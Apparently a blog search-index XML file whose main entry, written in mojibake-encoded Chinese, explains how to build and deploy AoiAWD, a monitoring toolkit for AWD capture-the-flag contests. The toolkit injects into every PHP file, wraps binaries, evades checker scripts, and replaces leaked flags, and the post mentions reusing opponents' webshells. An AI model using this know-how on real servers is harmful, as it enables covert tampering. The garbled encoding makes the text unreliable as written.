<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AoiAWD-èŒæ–°çš„å¾—åˆ†åˆ©å™¨</title>
    <url>/posts/16692/</url>
    <content><![CDATA[<h1>å‰è¨€</h1>
<p>è¿™ä¸¤å¤©ç©äº†ä¸€ä¸‹bugkuçš„awdæ¨¡å¼ï¼Œå› ä¸ºä¹‹å‰ä¹Ÿæ²¡æœ‰æ­£å¼ç©è¿‡ï¼Œæ‰€ä»¥æœ¬èŒæ–°è¢«å„ä½å¸ˆå‚…æ‰“å¾—æƒ¨æƒ¨ã€‚è¿™é‡Œåˆ†äº«ä¸€ä¸ªå®‰æ’ç»´æŠ¤çš„å¼€æºé¡¹ç›®AoiAWDï¼Œä¸è¿‡æ­å»ºå¯è°“æ˜¯é—®é¢˜è¿è¿ã€‚æ˜¨å¤©ä¸€å…±æœ‰10è½®ï¼Œå› ä¸ºä½¿ç”¨ä¸å½“ï¼Œå¯¼è‡´å‰äº”è½®éƒ½åœ¨ä¼ æ¢é’ˆå’Œæ‰§è¡Œçš„è¿‡ç¨‹ï¼Œæ‰€ä»¥é”™è¿‡äº†å‰äº”è½®çš„æœºä¼šï¼Œåé¢äº”è½®éƒ½åœ¨çœ‹å¸ˆå‚…ä»¬æ‰“è¿‡æ¥çš„é©¬å’Œæµé‡ï¼Œå»ç”¨ç€å¸ˆå‚…ä»¬çš„é©¬å»è¿æ¥åˆ«äººçš„æ‹¿flagå¾—åˆ†â€¦QWQã€‚ç­‰æœ‰æ—¶é—´ä¹Ÿç ”ç©¶ä¸€ä¸‹æ‰¹é‡å†™é©¬å’Œè·å–flagçš„å¥—è·¯ã€‚è¿™é‡Œè´´ä¸€ä¸‹æœ€åçš„ç»“æœå›¾å§ï¼Œä¸€å…±50æ”¯é˜Ÿä¼ï¼Œæœ€åå¾—äº†ç¬¬ä¸ƒåæƒ¨æƒ¨ğŸ˜«<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/GALX2N9Z%28%7D%28ZN%28I%242F7K3%247.png" alt=""></p>
<h1>é¡¹ç›®</h1>
<h2 id="é¡¹ç›®è¯´æ˜"><a class="header-anchor" href="#é¡¹ç›®è¯´æ˜">Â¶</a>é¡¹ç›®è¯´æ˜</h2>
<p>è¿™é‡Œç›´æ¥è´´å®˜æ–¹çš„è¯´æ˜</p>
<blockquote>
<p>åœ¨å¸¸è§çš„AWDæ¯”èµ›ä¸­ï¼Œé€‰æ‰‹å¾€å¾€æ‹¥æœ‰ä¸€å°ï¼ˆæˆ–è‹¥å¹²å°ï¼‰å¼€æ”¾äº†SSHæœåŠ¡å’Œé¢˜ç›®æœåŠ¡çš„â€œé¶æœºâ€ä½œä¸ºè‡ªå·±é˜²å®ˆçš„é˜µåœ°ã€‚</p>
<p>åœ¨å®é™…æ¯”èµ›ä¸­ï¼Œä¸»åŠæ–¹å¾€å¾€ä¼šé™åˆ¶é€‰æ‰‹çš„SSHæƒé™åˆ°ä¸€èˆ¬ç”¨æˆ·/ä»…å¯ç®¡ç†é¢˜ç›®çš„æƒé™ã€‚å¹¶ä¸”é’ˆå¯¹ä¸€äº›å¸¸è§çš„é€šç”¨é˜²ç«å¢™è„šæœ¬ï¼ˆé€šé˜²è„šæœ¬ï¼‰è¿›è¡Œè½®è¯¢å¼checkã€‚</p>
<p>AoiAWDæ˜¯é’ˆå¯¹ä»¥ä¸Šåœºæ™¯çš„é™åˆ¶å’Œç—›ç‚¹è®¾è®¡çš„ï¼Œç»„ä»¶é—´åŸºäºsocketé€šä¿¡ä»¥ä¾¿çµæ´»éƒ¨ç½²ï¼Œå…·æœ‰å›¾å½¢å¯è§†åŒ–ç•Œé¢ã€‚æ‰€æœ‰è¡Œä¸ºæ¢é’ˆå‡æ”¯æŒåœ¨æœ€ä½ç³»ç»Ÿæƒé™ä¸‹è¿è¡Œï¼Œä¸”é»˜è®¤ä¸ä¼šå¹²æ‰°é¢˜ç›®ä¸šåŠ¡é€»è¾‘çš„æ­£å¸¸è¿è¡Œï¼Œå¯ä»¥ç»•è¿‡ç»å¤§éƒ¨åˆ†checkè„šæœ¬çš„è¡Œä¸ºæ£€æŸ¥ã€‚æ”¯æŒå¦‚ä¸‹ç»´åº¦çš„è¡Œä¸ºæ•è·èƒ½åŠ›ï¼š</p>
<ul>
<li>Webè¾“å…¥è¾“å‡ºæ•°æ®æ•è·ã€è¾“å‡ºæµé‡ç¯¡æ”¹ï¼ˆæ²¡é”™ï¼Œä½ å¯ä»¥åŠ¨æ€æ›¿æ¢æ‰è¾“å‡ºçš„flagä¸ºä»»æ„å­—ç¬¦ä¸²ï¼‰</li>
<li>PWNç±»é¢˜ç›®è¾“å…¥è¾“å‡ºäº¤äº’æµé‡åŒ…æ•è·ã€å½“æ¬¡è¿è¡Œæ—¶å†…å­˜ç»“æ„æ•è·ã€è¾“å‡ºæµé‡ç¯¡æ”¹</li>
<li>æœåŠ¡å™¨è¿›ç¨‹UIDã€PIDã€çˆ¶è¿›ç¨‹ã€å¯åŠ¨å‚æ•°ã€è¿è¡Œæ—¶é—´æ•è·</li>
<li>æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿæ–°å»ºã€åˆ é™¤ã€ä¿®æ”¹ã€æƒé™å˜åŒ–è¡Œä¸ºæ•è·ã€‚</li>
</ul>
<p>æœ¬ç³»ç»Ÿè¿˜å†…ç½®äº†ç”Ÿå‘½å‘¨æœŸé’©å­ï¼Œå¯ä»¥é’ˆå¯¹æŸä¸€æ¬¡è¡Œä¸ºçš„äº§ç”Ÿç¼–å†™ç‰¹å®šçš„æ’ä»¶å»å®ç°æµé‡å±‚é¢çš„ä¸´æ—¶çƒ­è¡¥ä¸ã€å¢åŠ å¤§å±å‘Šè­¦ã€æ›¿æ¢è¾“å‡ºå­—ç¬¦ç­‰æ“ä½œã€‚ç³»ç»Ÿé»˜è®¤å†…ç½®äº†å¦‚ä¸‹æ’ä»¶å¯ä¾›å‚è€ƒï¼š</p>
<ul>
<li>FlagBuster: å½“æ£€æµ‹åˆ°è¾“å‡ºæµé‡ä¸­åŒ…å«äº†ç¬¦åˆæ­£åˆ™çš„flagå­—ç¬¦ä¸²ï¼Œäº§ç”Ÿå¤§å±å‘Šè­¦ã€æ ‡è®°è§¦å‘è§„åˆ™çš„æ•°æ®åŒ…ã€å¹¶å°†flagç²¾å‡†æ›¿æ¢ä¸ºçœ‹èµ·æ¥ä¹Ÿåƒflagçš„éšæœºæ•°ã€‚</li>
<li>KingWatcher: KoHç±»æ¯”èµ›ä¸­ï¼Œå½“æœ‰å…¶ä»–é˜Ÿä¼æ›¿æ¢æ‰äº†èµ›ç‚¹æ–‡ä»¶æ—¶ï¼Œäº§ç”Ÿå¤§å±å‘Šè­¦ã€‚</li>
<li>ZombieKiller: å½“æ–‡ä»¶ç³»ç»Ÿä¸Šå‡ºç°äº†ä¸æ­»é©¬è¡Œä¸ºï¼Œæ ‡è®°å¯ç–‘æ–‡ä»¶å¹¶äº§ç”Ÿå¤§å±å‘Šè­¦ã€‚</li>
</ul>
</blockquote>
<h3 id="AoiAWD-Core"><a class="header-anchor" href="#AoiAWD-Core">Â¶</a>AoiAWD Core</h3>
<p>æ˜¯æ•´ä¸ªç³»ç»Ÿè¿è¡Œçš„æ ¸å¿ƒï¼Œè´Ÿè´£æ¢é’ˆæ•°æ®æ”¶é›†å…¥åº“ã€æ’ä»¶ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€Webå‰ç«¯æ‰˜ç®¡æœåŠ¡ã€‚</p>
<ul>
<li>è¿è¡Œcompile.phpå³å¯æ‰“åŒ…ä¸ºä¸€ä¸ªå•ç‹¬çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ–¹ä¾¿æºå¸¦ã€‚</li>
<li>æ’ä»¶éœ€è¦æ”¾åˆ°å’Œaoiawd.pharåŒç›®å½•ä¸‹çš„pluginsæ–‡ä»¶å¤¹ï¼ŒWebç«¯æœ‰ç›´æ¥é‡è½½æ’ä»¶çš„æŒ‰é’®ï¼Œå¯ä»¥å®ç°çƒ­æ›´æ–°ã€‚</li>
<li>ä¸€èˆ¬æƒ…å†µä¸‹å¯ç›´æ¥æ— å‚æ•°è¿è¡Œï¼Œå¦‚æœéœ€è¦ç‰¹åˆ«çš„é…ç½®ï¼Œå¯ä»¥å¢åŠ -hå‚æ•°æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AoiAWD: Data Visualization Tool &amp; Main Server</span><br><span class="line">Usage: .&#x2F;aoiawd.phar [OPTIONS]</span><br><span class="line">         -w [URI] HTTP server bind URI. Default: tcp:&#x2F;&#x2F;0.0.0.0:1337</span><br><span class="line">         -l [URI] Log recoard server bind URI. Default: tcp:&#x2F;&#x2F;0.0.0.0:8023</span><br><span class="line">         -m [URI] MongoDB server URI. Default: mongodb:&#x2F;&#x2F;127.0.0.1:27017</span><br><span class="line">         -t [STRING] Access token. Default: [RANDOM]</span><br><span class="line">         -h This help info</span><br></pre></td></tr></table></figure>
<ul>
<li>è¿è¡Œåä¼šæ˜¾ç¤ºæœ¬æ¬¡å¯åŠ¨åçš„ä¸´æ—¶å¯†é’¥ï¼Œæ˜¯è®¿é—®Webå‰ç«¯çš„å¿…è¦ä¿¡æ¯</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[2020-09-24 15:21:21] MainServer.notice: AccessToken: 0de8d57b3e91dc66 [] [] #&lt;-- Webè®¿é—®å¯†é’¥</span><br><span class="line">...</span><br><span class="line">[2020-09-24 15:21:21] Amp\Http\Server\Server.info: Listening on http:&#x2F;&#x2F;0.0.0.0:1337&#x2F; [] [] #&lt;-- Webå‰ç«¯åœ°å€</span><br><span class="line">[2020-09-24 15:21:21] aoicommon\socket\AsyncTCPServer.info: Listening on 0.0.0.0:8023 [] [] #&lt;-- æ¢é’ˆä¸Šçº¿åœ°å€</span><br></pre></td></tr></table></figure>
<h3 id="Guardian"><a class="header-anchor" href="#Guardian">Â¶</a>Guardian</h3>
<p>ä¸€ä¸ªäºŒè¿›åˆ¶PWNçš„å½±å­å¤–å£³ï¼Œå…¶åŸç†æ˜¯åŒ…è£¹åœ¨PWNé¢˜ç›®å¤–ä¾§ï¼Œåœ¨æ¯æ¬¡è¢«å¯åŠ¨çš„æ—¶å€™é€æ˜è®°å½•STDINä¸STDOUTçš„æµé‡ï¼Œå¹¶å¿«ç…§PWNç¨‹åºçš„å†…å­˜ç»“æ„(/proc/???/mem)ä¸Šä¼ å›AoiAWD Coreã€‚</p>
<ul>
<li>åœ¨é¡¹ç›®ç›®å½•è¿è¡Œcompile.phpå°†ä¼šç¼–è¯‘å½±å­å£³ç¨‹åºå’Œæ†ç»‘ç¨‹åº: guardian.pharï¼Œä¸€èˆ¬æ˜¯åœ¨é€‰æ‰‹ç”µè„‘ä¸Šè¿›è¡Œæ†ç»‘åå°†ç”Ÿæˆæ–‡ä»¶ä¸Šä¼ åˆ°é¶æœºã€‚</li>
<li>ç›´æ¥è¿è¡Œæ†ç»‘ç¨‹åºä¼šè¾“å‡ºå¸®åŠ©æ–‡æœ¬ï¼Œå…¶ä¸­æ¯”è¾ƒé‡è¦çš„ä¸€äº›å‚æ•°æ˜¯:
<ul>
<li>-i: è¾“å…¥éœ€è¦å¥—å£³çš„PWNé¢˜ç›®ç¨‹åºè·¯å¾„</li>
<li>-s: è¾“å…¥å¯ä»¥ä»é¶æœºè®¿é—®åˆ°æ¢é’ˆä¸Šçº¿åœ°å€çš„URLï¼Œæ¯”å¦‚è¯´192.168.???.???:8023</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Guardian: AoiAWD ELF PWNMonitor Tool</span><br><span class="line">Usage: .&#x2F;guardian.phar [PATH]</span><br><span class="line">         -i [PATH] Original ELF.</span><br><span class="line">         -o [PATH] Path of patched ELF. Default: &#123;$OriginalELF&#125;.guardianed</span><br><span class="line">         -s [URI] Log recoard server URI. Default: 127.0.0.1:8023</span><br><span class="line">         -h This help info</span><br></pre></td></tr></table></figure>
<h3 id="TapeWorm"><a class="header-anchor" href="#TapeWorm">Â¶</a>TapeWorm</h3>
<p>ä¸€ä¸ªPHP Webçš„å½±å­å¤–å£³ï¼Œå…¶åŸç†æ˜¯è‡ªåŠ¨æ³¨å…¥åˆ°<strong>æ‰€æœ‰</strong>PHPæ–‡ä»¶çš„å¤´éƒ¨ï¼Œæ”¯æŒè¾“å…¥è¾“å‡ºæµé‡çš„æŠ“å–ä¸ä¸ŠæŠ¥ï¼ŒåŒæ—¶å…·æœ‰å¤„ç†è¾“å‡ºæ•°æ®çš„èƒ½åŠ›ï¼Œå®ç°è¾“å‡ºå†…å®¹ç¯¡æ”¹ã€‚</p>
<ul>
<li>ç¨‹åºå†…éƒ¨çš„ä»£ç å·²ç»å®ç°äº†å•å®ä¾‹å¯åŠ¨ï¼Œå³ä¾¿æ˜¯å±‚å±‚includeäº†å¤šæ¬¡ï¼Œä¹Ÿåªä¼šè¿è¡Œæœ€å…ˆè§¦å‘çš„å½±å­å¤–å£³ã€‚æ‰€ä»¥ä¸ç”¨æ‹…å¿ƒå¤æ‚çš„é¢˜ç›®å½±å“æ€§èƒ½ã€‚</li>
<li>è‡ªåŠ¨æ³¨å…¥ç¨‹åºä¼šæ™ºèƒ½è¯†åˆ«é¢å‘å¯¹è±¡çš„æ–‡ä»¶(åŒ…å« namespace å…³é”®å­—)ï¼Œå’Œç›´æ¥é¢å‘è¿‡ç¨‹çš„PHPæ–‡ä»¶ï¼Œ<strong>ä¸€èˆ¬</strong>æƒ…å†µä¸‹ä¸ä¼šé€ æˆè¯­æ³•é”™è¯¯ã€‚</li>
<li>è‡ªåŠ¨æ³¨å…¥ç¨‹åºä¼šè¯†åˆ«å·²ç»è¢«æ³¨å…¥çš„è„šæœ¬å¹¶åŠ ä»¥è·³è¿‡ï¼Œæ‰€ä»¥å¤šæ¬¡åå¤æ— è„‘å¯¹webæ ¹ç›®å½•è¿è¡Œæ³¨å…¥ç¨‹åºå¹¶ä¸ä¼šé€ æˆä»€ä¹ˆå¤ªå¤§çš„é—®é¢˜ã€‚</li>
<li>è¿è¡Œcompile.phpå°±å¯ä»¥ç”Ÿæˆè‡ªåŠ¨æ³¨å…¥ç¨‹åºï¼Œä¸€èˆ¬æƒ…å†µä¸‹å¯ä»¥ä¸Šä¼ åˆ°é¶æœºä¸Šç›´æ¥å¯¹webæ ¹ç›®å½•è¿›è¡Œæ³¨å…¥ï¼Œæˆ–è€…åœ¨é€‰æ‰‹ç”µè„‘ä¸Šæ³¨å…¥å¥½ä¹‹åå†ä¸Šä¼ åˆ°é¶æœºä¸Šã€‚</li>
<li><strong>ä¸€æ—¶æ³¨å…¥ä¸€æ—¶çˆ½ï¼Œå¿˜è®°å¤‡ä»½å®•æœºæ…Œ</strong></li>
<li>ç›´æ¥è¿è¡Œæ³¨å…¥ç¨‹åºä¼šæ˜¾ç¤ºå¸®åŠ©æ–‡æœ¬ï¼Œå…¶ä¸­æ¯”è¾ƒé‡è¦çš„ä¸€äº›å‚æ•°æ˜¯:
<ul>
<li>-d: éœ€è¦æ³¨å…¥å¤–å£³çš„webæ ¹ç›®å½•ï¼Œä¼šä»æ­¤ç›®å½•é€’å½’æ„ŸæŸ“æ‰€æœ‰çš„PHPæ–‡ä»¶ã€‚</li>
<li>-s: è¾“å…¥å¯ä»¥ä»é¶æœºè®¿é—®åˆ°æ¢é’ˆä¸Šçº¿åœ°å€çš„URLï¼Œæ¯”å¦‚è¯´192.168.???.???:8023ã€‚</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TapeWorm: AoiAWD PHP WebMonitor Tool</span><br><span class="line">Usage: .&#x2F;tapeworm.phar [PATH]</span><br><span class="line">         -d [PATH] WebMonitor inject dir.</span><br><span class="line">         -s [URI] Log recoard server URI. Default: 127.0.0.1:8023</span><br><span class="line">         -f [PATH] Inject file path. Default: &#123;$dir&#125;</span><br><span class="line">         -h This help info</span><br></pre></td></tr></table></figure>
<h3 id="RoundWorm"><a class="header-anchor" href="#RoundWorm">Â¶</a>RoundWorm</h3>
<p>ä¸€ä¸ªç›‘æ§æ–‡ä»¶ç³»ç»Ÿå’Œè¿›ç¨‹çš„ç³»ç»Ÿè¡Œä¸ºç›‘è§†å™¨ï¼Œå…¶åŸç†æ˜¯æ‰«æ/procæ–‡ä»¶å¤¹è·å–å½“å‰æ­£åœ¨è¿è¡Œçš„æ‰€æœ‰è¿›ç¨‹çš„ä¿¡æ¯ï¼Œä»¥åŠåˆ©ç”¨Linuxç³»ç»Ÿçš„inotifyåŠŸèƒ½å¯¹æŒ‡å®šæ–‡ä»¶å¤¹çš„æ•æ„Ÿæ–‡ä»¶æ“ä½œè¿›è¡Œå…¨é¢çš„è®°å½•ã€‚</p>
<ul>
<li>ç›´æ¥è¿è¡Œmakeå°±å¯ä»¥ç¼–è¯‘ç”Ÿæˆ</li>
<li>ä¸€èˆ¬æ¥è®²è¯¥ç¨‹åºåœ¨é¶æœºä¸Šè¿è¡Œï¼Œé€‰æ‰‹ç”µè„‘ä¸Šæ²¡å¿…è¦æ‰§è¡Œè¿™ç©æ„ã€‚</li>
<li>æ·»åŠ -hå‚æ•°å³å¯çœ‹åˆ°å¸®åŠ©æ–‡æ¡£ï¼Œå…¶ä¸­æ¯”è¾ƒé‡è¦çš„ä¸€äº›å‚æ•°æ˜¯:
<ul>
<li>-d: åå°è¿è¡Œï¼Œä½ å½“ç„¶ä¸æƒ³å…³æ‰sshçš„æ—¶å€™å°±æŠŠæ¢é’ˆä¹Ÿç»™å…³äº†ã€‚</li>
<li>-s: è¾“å…¥å¯ä»¥ä»é¶æœºè®¿é—®åˆ°æ¢é’ˆä¸Šçº¿åœ°å€çš„IPï¼Œæ¯”å¦‚è¯´192.168.???.???ã€‚</li>
<li>-w: éœ€è¦ç›‘æ§æ–‡ä»¶å˜åŒ–çš„è·¯å¾„ï¼Œå¦‚æœæœ‰å¤šä¸ªè·¯å¾„ä½¿ç”¨â€™;'åˆ†å‰²ï¼Œæ¯”å¦‚: -w â€œ/tmp;/var/www/htmlâ€</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RoundWorm: AoiAWD Filesystem &amp; Process Monitor Tool</span><br><span class="line">Usage: .&#x2F;roundworm [OPTIONS]</span><br><span class="line">         -d Running in daemon mode.</span><br><span class="line">         -s [HOST] AoiAWD Probe IP. Default: 127.0.0.1</span><br><span class="line">         -p [PORT] AoiAWD Probe PORT. Default: 8023</span><br><span class="line">         -w [PATH] Inotify watch dir, &#39;;&#39; as divider. Default: &#x2F;tmp</span><br><span class="line">         -i [MSECOND] Process watch interval. Default: 100</span><br><span class="line">         -h This help info</span><br></pre></td></tr></table></figure>
<h2 id="æ­å»ºæµç¨‹"><a class="header-anchor" href="#æ­å»ºæµç¨‹">Â¶</a>æ­å»ºæµç¨‹</h2>
<p>è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯é˜¿é‡Œäº‘çš„ubuntu18.04ç³»ç»Ÿ<br>
é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/DasSecurity-HatLab/AoiAWD">https://github.com/DasSecurity-HatLab/AoiAWD</a><br>
é¦–å…ˆéœ€è¦æ›´æ–°ä¸€æ³¢</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get install build-essential</span><br></pre></td></tr></table></figure>
<p><strong>å®‰è£…gitå’Œä¸‹è½½é¡¹ç›®</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install git</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com.cnpmjs.org&#x2F;DasSecurity-HatLab&#x2F;AoiAWD.git</span><br></pre></td></tr></table></figure>
<p><strong>å®‰è£…inotifywait</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir inotifywait   #æ–°å»ºæ–‡ä»¶å¤¹</span><br><span class="line">cd inotifywait      #è¿›å…¥æ–‡ä»¶å¤¹</span><br><span class="line">wget http:&#x2F;&#x2F;github.com&#x2F;downloads&#x2F;rvoicilas&#x2F;inotify-tools&#x2F;inotify-tools-3.14.tar.gz   #ä¸‹è½½</span><br><span class="line">tar zxf inotify-tools-3.14.tar.gz   #è§£å‹</span><br><span class="line">cd inotify-tools-3.14&#x2F;</span><br><span class="line">.&#x2F;configure &amp;&amp; make &amp;&amp; make install #å®‰è£…</span><br></pre></td></tr></table></figure>
<p>å¯ç”¨<code>man inotifywait</code>å‘½ä»¤æŸ¥çœ‹æ–‡æ¡£ä»¥ç¡®å®šæ˜¯å¦å®‰è£…æ­£ç¡®ï¼Œç„¶åæŒ‰qé€€å‡º<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/QXB3LNP%7B6%25LVW~Y%60%5DIXGSJ0.png" alt=""><br>
<strong>å®‰è£…mongdbéœ€è¦çš„ä¾èµ–</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install mongodb-server</span><br><span class="line">sudo apt-get install php7.2-dev php-pear</span><br><span class="line">sudo pecl install mongodb   				#è¿™é‡Œä¸‹è½½é€Ÿåº¦éœ€è¦ç­‰å¤šç‚¹æ—¶é—´</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢åˆ†åˆ«æ˜¯è¿™ä¸‰æ¡å‘½ä»¤å®‰è£…æˆåŠŸçš„æˆªå›¾ï¼š<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/mon_1.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/mon_2.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/mon_3.png" alt=""><br>
å¦‚æœå‡ºç°äº†æç¤º<code>You should add &quot;extension=mongodb.so&quot; to php.ini</code>è¯´æ˜æˆåŠŸäº†ï¼Œæ¥ç€æˆ‘ä»¬å»phpçš„é…ç½®æ–‡ä»¶php.iniè¿›è¡Œä¿®æ”¹<br>
è·¯å¾„ä¸€èˆ¬ä¸º:<code>/etc/php/7.2/cli/php.ini</code>ï¼Œ<a href="http://%E6%8E%A5%E7%9D%80%E6%88%91%E4%BB%AC%E5%8E%BB%E6%8B%93%E5%B1%95%E5%A4%84%E5%8A%A0%E4%B8%8Aextension=mongodb.so">æ¥ç€æˆ‘ä»¬å»æ‹“å±•å¤„åŠ ä¸Šextension=mongodb.so</a><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/3CBP_L%2507KRWPG%40EF96MB0A.png" alt=""><br>
ç„¶åå†æŠŠè¿™ä¸¤ä¸ªå¼€å…³æ”¹æˆOffï¼Œè®°ä½è¦æŠŠå‰é¢çš„åˆ†å·å»æ‰ï¼Œä¸ç„¶ä¼šè¢«æ³¨é‡Šæ‰<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/7SM9T%60%5BK%29%7D52XNR_%40~1HI6L.png" alt=""><br>
<strong>æ„å»ºFrontedé¡¹ç›®</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install npm      #å®‰è£…npm</span><br><span class="line">cd AoiAWD  			#è¿›å…¥ä¸‹è½½çš„é¡¹ç›®</span><br><span class="line">cd Frontend</span><br><span class="line">npm install</span><br><span class="line">npm run build</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢åˆ†åˆ«æ˜¯æœ€åä¸¤æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸçš„æˆªå›¾ï¼š<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/7%24%401QSWN4%40%5B%24%60FGF~CQFT%5DV.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/7R5E7F8J%24NH69%60%60Q%5DOCHN%608.png" alt=""><br>
æ‰§è¡ŒæˆåŠŸä¼šåœ¨dist/ç›®å½•ä¸‹å¾—åˆ°index.htmlå’Œstaticç›®å½•</p>
<p><strong>æ„å»ºAoiAWDcore</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd AoiAWD</span><br><span class="line">rm -rf src&#x2F;public&#x2F;*						#åˆ é™¤</span><br><span class="line">cp -r ..&#x2F;Frontend&#x2F;dist&#x2F;* src&#x2F;public&#x2F;	  #å¤åˆ¶é™æ€èµ„æº</span><br><span class="line">php compile.php</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡ŒæˆåŠŸæˆªå›¾ï¼š<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/D%5DS33%60%25S3%28_CZKLE_4XTFH3.png" alt=""><br>
æ‰§è¡ŒæˆåŠŸåå¾—åˆ°aoiawd.phar</p>
<p><strong>æ„å»ºTapeWorm</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd TapeWorm</span><br><span class="line">php compile.php</span><br></pre></td></tr></table></figure>
<p>æ„å»ºæˆåŠŸåå¾—åˆ°tapeworm.phar</p>
<p><strong>æ„å»ºGuardian</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd Guardian</span><br><span class="line">php compile.php</span><br></pre></td></tr></table></figure>
<p>æ„å»ºæˆåŠŸåå¾—åˆ°guardian.phar</p>
<p><strong>æ„å»ºRoundWorm</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd RoundWorm</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>æ„å»ºæˆåŠŸä¼šå¾—åˆ°roundworm<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/8A8%24_NC6%7BHMR%5DVZM%24Z%7B4C%409.png" alt=""><br>
<strong>å¯åŠ¨AoiAWD</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd AoiAWD</span><br><span class="line">sudo mongod</span><br><span class="line">.&#x2F;aoiawd.phar</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œåï¼š<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/4%7D89%5DOMY%25KLM%60K85%7DX%5D%40N_K.png" alt=""><br>
ä¼šæä¾›ä¸€ä¸ªéšæœºtokenå’Œå¼€æ”¾ä¸‰ä¸ªç«¯å£ï¼Œ1337æ˜¯webè®¿é—®ç«¯å£ï¼Œ8023æ˜¯æ¢é’ˆçš„æ¥æ”¶ç«¯å£ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡ip:1337å»è®¿é—®å¼€å¯çš„AoiAWDç•Œé¢<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/PG2FKEM%24%5D%5B6P3BH%5B5IHV270.png" alt=""></p>
<h2 id="ä½¿ç”¨æ–¹æ³•"><a class="header-anchor" href="#ä½¿ç”¨æ–¹æ³•">Â¶</a>ä½¿ç”¨æ–¹æ³•</h2>
<p>æ­å»ºå®ŒåæŠŠåˆšåˆšé‚£äº›æ–‡ä»¶å¤¹ä¸­çš„ç”Ÿæˆçš„æ–‡ä»¶ä¾‹å¦‚xxx.pharç­‰å‘é€åˆ°æä¾›ç»™æˆ‘ä»¬çš„é¶æœºä¸Šå»ï¼Œç„¶åè®°å¾—èµ‹äºˆæƒé™ï¼Œipæ˜¯äº‘æœåŠ¡å™¨ipï¼Œç«¯å£å°±æ˜¯é»˜è®¤8023</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x tapeworm.phar</span><br><span class="line">chmod +x roundworm</span><br><span class="line">chmod +x guardian.phar</span><br><span class="line">.&#x2F;tapeworm.phar -d ç›®å½• -s ip:port</span><br><span class="line">.&#x2F;roundworm  -w ç›®å½• -s ip -p port</span><br><span class="line">.&#x2F;guardian.phar -i ç›®å½• -s ip:port</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè´´å½“æ—¶æ¯”èµ›çš„ä¸€äº›å›¾ï¼š<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/Q%28%25%25P14U%7DOJ~%29C5ZO1%24XR0S.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/AoiAWD/VMCECNOZK%295W79%6019%60%606U%28G.png" alt=""></p>
]]></content>
      <tags>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title>bugkuè‡ªåŠ¨ç­¾åˆ°ç¨‹åº</title>
    <url>/posts/51649/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
